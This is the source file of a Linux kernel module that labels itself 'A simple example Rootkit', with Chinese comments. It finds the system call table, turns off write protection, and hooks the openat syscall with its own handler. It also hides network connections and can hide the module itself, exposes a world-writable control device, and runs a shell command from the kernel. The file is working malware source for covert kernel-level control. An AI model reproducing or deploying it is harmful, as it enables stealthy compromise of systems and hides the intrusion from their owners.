#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/module.h>
#include "functions.c"

// 模块加载、卸载函数定义
static int __init rootkit_init(void)
{
    //获取系统调用表地址
    real_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    //错误处理
    if (!real_sys_call_table)
    {
        pr_info("sys call table not found");
        return -EFAULT;
    }
    if (!hide_connect_init(real_sys_call_table))
    {
         pr_info("hide_port_init fail!");
         return -EFAULT;
    }
    // //打印出系统调用表地址
    pr_info("real_sys_call_table: %p", real_sys_call_table);

    // 获取真实的sys_openat函数地址
    // __NR_openat是openat系统调用的系统调用号,https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
    real_sys_openat = (void *)real_sys_call_table[__NR_openat];
    
    // 关闭写保护，将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱
    disable_wp();
    real_sys_call_table[__NR_openat] = (void *)my_sys_openat;
    
    // 恢复现场，打开写保护
    enable_wp();
    
    pr_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);

    // 注册设备
    major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
    if (major_num < 0)
        return major_num;

    // 创建设备响应类模块
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(module_class))
    {
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_class);
    }

    // 创建设备节点
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
    if (IS_ERR(module_device))
    {
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_device);
    }
    __file = filp_open(DEVICE_PATH, O_RDWR, 0);
    if (IS_ERR(__file)) // failed
    {
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(__file);
    }
    __inode = file_inode(__file);
    __inode->i_mode |= 0666;
    filp_close(__file, NULL);

    module_info();
    hide_myself();
    show_myself();
    pr_info("Module install successful##!\n");
    exec_cmd("echo 123 >> /tmp/result.txt");
    return 0;
}

static void __exit rootkit_exit(void)
{
    // // 模块退出的时候，需要恢复现场，将修改过的地址再改回去
    disable_wp();
    real_sys_call_table[__NR_openat] = (void *)real_sys_openat;
    enable_wp();
    
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    hide_connect_exit(real_sys_call_table);
    pr_info("Module uninstall successful!\n");
}

// 模块信息声明
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ice");
MODULE_DESCRIPTION("A simple example Rootkit.");
MODULE_VERSION("1.0");
module_init(rootkit_init);
module_exit(rootkit_exit);
